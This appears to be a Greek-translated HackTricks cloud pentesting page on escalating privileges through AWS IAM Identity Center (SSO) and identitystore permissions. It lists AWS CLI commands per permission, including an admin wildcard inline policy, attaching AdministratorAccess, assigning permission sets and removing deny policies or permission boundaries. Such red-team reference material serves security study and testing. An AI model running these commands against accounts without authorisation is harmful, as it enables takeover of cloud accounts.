# AWS - SSO & identitystore Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## AWS Identity Center / AWS SSO

Για περισσότερες πληροφορίες σχετικά με το AWS Identity Center / AWS SSO ελέγξτε:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Σημειώστε ότι από **προεπιλογή**, μόνο **χρήστες** με δικαιώματα **από** τον **Λογαριασμό Διαχείρισης** θα μπορούν να έχουν πρόσβαση και **να ελέγχουν το IAM Identity Center**.\
Χρήστες από άλλους λογαριασμούς μπορούν να το επιτρέψουν μόνο αν ο λογαριασμός είναι **Ανατεθειμένος Διαχειριστής.**\
[Ελέγξτε τα έγγραφα για περισσότερες πληροφορίες.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Reset Password~~

Ένας εύκολος τρόπος για να κλιμακώσετε τα δικαιώματα σε περιπτώσεις όπως αυτή θα ήταν να έχετε μια άδεια που να επιτρέπει την επαναφορά κωδικών πρόσβασης χρηστών. Δυστυχώς, είναι μόνο δυνατό να σταλεί ένα email στον χρήστη για να επαναφέρει τον κωδικό του, οπότε θα χρειαστείτε πρόσβαση στο email του χρήστη.

### `identitystore:CreateGroupMembership`

Με αυτή την άδεια είναι δυνατό να τοποθετήσετε έναν χρήστη μέσα σε μια ομάδα ώστε να κληρονομήσει όλα τα δικαιώματα που έχει η ομάδα.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
{% endcode %}

### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να χορηγήσει επιπλέον άδειες σε ένα Permission Set που έχει χορηγηθεί σε έναν χρήστη υπό τον έλεγχό του

{% code overflow="wrap" %}
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να παραχωρήσει επιπλέον άδειες σε ένα Permission Set που έχει παραχωρηθεί σε έναν χρήστη υπό τον έλεγχό του

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να χορηγήσει επιπλέον άδειες σε ένα Permission Set που έχει χορηγηθεί σε έναν χρήστη υπό τον έλεγχό του.

{% hint style="warning" %}
Για να εκμεταλλευτείτε αυτές τις άδειες σε αυτή την περίπτωση, πρέπει να γνωρίζετε το **όνομα μιας πολιτικής διαχείρισης πελατών που βρίσκεται σε ΟΛΟΥΣ τους λογαριασμούς** που θα επηρεαστούν.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:CreateAccountAssignment`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να δώσει ένα Permission Set σε έναν χρήστη υπό τον έλεγχό του σε έναν λογαριασμό.

{% code overflow="wrap" %}
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
{% endcode %}

### `sso:GetRoleCredentials`

Επιστρέφει τα STS βραχυπρόθεσμα διαπιστευτήρια για ένα συγκεκριμένο όνομα ρόλου που έχει ανατεθεί στον χρήστη.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Ωστόσο, χρειάζεστε ένα access token που δεν είμαι σίγουρος πώς να αποκτήσετε (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει τη σύνδεση μεταξύ μιας AWS managed policy και του καθορισμένου permission set. Είναι δυνατόν να παραχωρηθούν περισσότερα προνόμια μέσω **αφαίρεσης μιας managed policy (deny policy)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
{% endcode %}

### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει τη σύνδεση μεταξύ μιας πολιτικής που διαχειρίζεται ο πελάτης από το καθορισμένο σύνολο αδειών. Είναι δυνατή η χορήγηση περισσότερων προνομίων μέσω **αφαίρεσης μιας διαχειριζόμενης πολιτικής (πολιτική άρνησης)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
{% endcode %}

### `sso:DeleteInlinePolicyFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει τις άδειες από μια inline policy από το permission set. Είναι δυνατόν να παραχωρηθούν **περισσότερες άδειες αποσυνδέοντας μια inline policy (deny policy)**.

{% code overflow="wrap" %}
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
{% endcode %}

### `sso:DeletePermissionBoundaryFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει το Permission Boundary από το σύνολο αδειών. Είναι δυνατόν να παραχωρηθούν **περισσότερες άδειες αφαιρώντας τους περιορισμούς στο Permission Set** που δίνονται από το Permission Boundary.

{% code overflow="wrap" %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{% endcode %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
